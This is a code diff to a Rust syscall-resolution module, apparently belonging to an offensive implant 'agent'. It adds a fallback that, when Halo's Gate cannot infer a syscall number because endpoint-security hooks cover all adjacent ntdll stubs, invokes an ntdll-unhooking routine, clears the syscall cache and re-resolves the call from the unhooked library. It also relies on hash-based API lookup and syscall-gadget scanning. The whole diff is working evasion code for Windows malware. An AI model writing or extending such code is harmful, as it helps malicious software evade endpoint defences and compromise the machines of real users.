@@ -46,6 +46,35 @@ static CLEAN_NTDLL: OnceLock<usize> = OnceLock::new();
 /// Per-call SSN cache: function name → (ssn, gadget_addr).
 static SYSCALL_CACHE: OnceLock<Mutex<HashMap<String, (u32, usize)>>> = OnceLock::new();
 
+/// Optional callback that gets invoked when Halo's Gate fails to infer an SSN.
+/// The agent's `ntdll_unhook` module registers this to perform a full ntdll
+/// unhook before retrying.  The callback returns `true` if unhooking succeeded
+/// (caller should retry SSN resolution) or `false` if it failed.
+type UnhookCallback = fn() -> bool;
+static UNHOOK_CALLBACK: OnceLock<UnhookCallback> = OnceLock::new();
+
+/// Register a callback to be invoked when Halo's Gate fails (all adjacent
+/// syscall stubs are hooked).  The callback should perform ntdll unhooking
+/// and return `true` if successful, `false` otherwise.
+///
+/// This is the integration point between `nt_syscall` and the agent's
+/// `ntdll_unhook` module.  Call once during agent initialisation:
+///
+/// ```rust,ignore
+/// nt_syscall::set_halo_gate_fallback(ntdll_unhook::halo_gate_fallback);
+/// ```
+pub fn set_halo_gate_fallback(callback: UnhookCallback) {
+    let _ = UNHOOK_CALLBACK.set(callback);
+}
+
+/// Invalidate the SSN cache, forcing all subsequent `get_syscall_id` calls
+/// to re-resolve from the clean (or bootstrap) ntdll.
+pub fn invalidate_ssn_cache() {
+    if let Some(cache) = SYSCALL_CACHE.get() {
+        cache.lock().unwrap().clear();
+    }
+}
+
 // ─── Hook-byte detection & stub parsing ────────────────────────────────────
 
 /// Attempt to extract the SSN and gadget address directly from an unhooked
@@ -275,7 +304,52 @@ fn get_bootstrap_ssn(func_name: &str) -> Option<SyscallTarget> {
             );
         }
 
-        let ssn_target = infer_ssn_halo_gate(ntdll_base, func_addr)?;
+        let ssn_target = match infer_ssn_halo_gate(ntdll_base, func_addr) {
+            Some(t) => t,
+            None => {
+                // Halo's Gate failed — all adjacent stubs are hooked.
+                // Try the registered unhook callback (agent's ntdll_unhook).
+                log::warn!(
+                    "nt_syscall: Halo's Gate failed for {func_name} \
+                     (all adjacent stubs hooked); invoking ntdll unhook fallback"
+                );
+                if let Some(callback) = UNHOOK_CALLBACK.get() {
+                    if callback() {
+                        // Unhook succeeded — clear cache and retry resolution.
+                        if let Some(cache) = SYSCALL_CACHE.get() {
+                            cache.lock().unwrap().remove(func_name);
+                        }
+                        log::info!(
+                            "nt_syscall: ntdll unhook succeeded, retrying SSN for {func_name}"
+                        );
+                        // Re-fetch the (now clean) stub address and parse it.
+                        let ntdll_base2 = pe_resolve::get_module_handle_by_hash(
+                            pe_resolve::HASH_NTDLL_DLL,
+                        )?;
+                        let func_addr2 = pe_resolve::get_proc_address_by_hash(
+                            ntdll_base2,
+                            target_hash,
+                        )?;
+                        if let Some(t) = parse_syscall_stub(func_addr2) {
+                            return Some(t);
+                        }
+                        // If parse_syscall_stub still fails, try Halo's Gate one more time.
+                        infer_ssn_halo_gate(ntdll_base2, func_addr2)?
+                    } else {
+                        log::error!(
+                            "nt_syscall: ntdll unhook callback failed for {func_name}"
+                        );
+                        return None;
+                    }
+                } else {
+                    log::error!(
+                        "nt_syscall: Halo's Gate failed for {func_name} \
+                         and no unhook callback is registered"
+                    );
+                    return None;
+                }
+            }
+        };
 
         if is_hooked {
             if let Some(gadget_addr) = scan_text_for_syscall_gadget(ntdll_base) {
